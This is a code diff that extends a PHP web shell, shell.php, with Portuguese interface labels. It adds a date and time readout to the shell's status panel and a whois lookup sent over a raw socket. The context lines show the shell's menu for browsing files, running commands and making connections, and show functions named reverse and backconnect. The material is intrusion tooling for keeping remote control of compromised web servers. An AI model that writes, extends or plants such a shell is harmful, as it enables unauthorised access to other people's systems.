@@ -280,6 +280,15 @@ echo "
 			Os: ";echo php_uname('n');echo"<br />
 			Ip: $_SERVER[REMOTE_ADDR]<br />
 			Host: $_SERVER[HTTP_HOST]<br />
+			";$Dia = date(d);echo"
+			";$Mes = date(m);echo"
+			";$Ano = date(Y);echo"
+			";echo "Data: ".$Dia."/".$Mes."/".$Ano;echo"<br />
+			";$Hora = date(H);echo"
+			";$Minuto = date(i);echo"
+			";$Segundo = date(s);echo"
+			";echo "Hora: ".$Hora.":".$Minuto.":".$Segundo;echo"<br />
+
 			</small>
 		</div>
 	</div>
@@ -299,6 +308,14 @@ echo "
 			Os: ";echo php_uname('n');echo"<br />
 			Ip: $_SERVER[REMOTE_ADDR]<br />
 			Host: $_SERVER[HTTP_HOST]<br />
+			";$Dia = date(d);echo"
+			";$Mes = date(m);echo"
+			";$Ano = date(Y);echo"
+			";echo "Data: ".$Dia."/".$Mes."/".$Ano;echo"<br />
+			";$Hora = date(H);echo"
+			";$Minuto = date(i);echo"
+			";$Segundo = date(s);echo"
+			";echo "Hora: ".$Hora.":".$Minuto.":".$Segundo;echo"<br />
 			</small>
 		</div>
 	</div>
@@ -312,6 +329,7 @@ echo "
 		<ul>
 			<li><a href='shell.php'>Arquivos</a></li>
 			<li><a href='?pag=comandos'>Comandos</a></li>
+			<li><a href='?pag=whois'>Whois</a></li>
 			<li><a href='?pag=conexao'>Conexão</a></li>
 			<li><a href='?pag=lookup'>Lookup</a></li>
 			<li><a href='?pag=info'>Info</a></li>
@@ -421,6 +439,10 @@ else if($page == 'info'){
 else if($page == 'renomear'){
 	$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
 	renomear($arquivo, $dir);
+}
+
+else if($page == 'whois'){
+	whois();
 }
 
 else{
@@ -734,6 +756,24 @@ function reverse($host){
 			echo fgets($p,1000)."<br/>";
 		}
 	}
+
+function whois(){
+	echo "
+	<form action='shell.php?pag=whois' method='post'>
+	Dominio: <input type='text' name='nomedominio'>
+	<input type='submit' name='inciarwhois' value='Ir'>
+	</form>
+	";
+	$dominio = $_POST['nomedominio'];
+	$nomedominio = $dominio."\r\n";
+	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+	socket_getpeername($socket, $dominio);
+	socket_connect($socket, '200.160.2.3', 43);
+	socket_write($socket, $nomedominio, strlen($nomedominio));
+	$resultado  = socket_read($socket, 1024);
+	echo $resultado;
+	socket_close($socket);
+}
 
 function backconnect()
 {
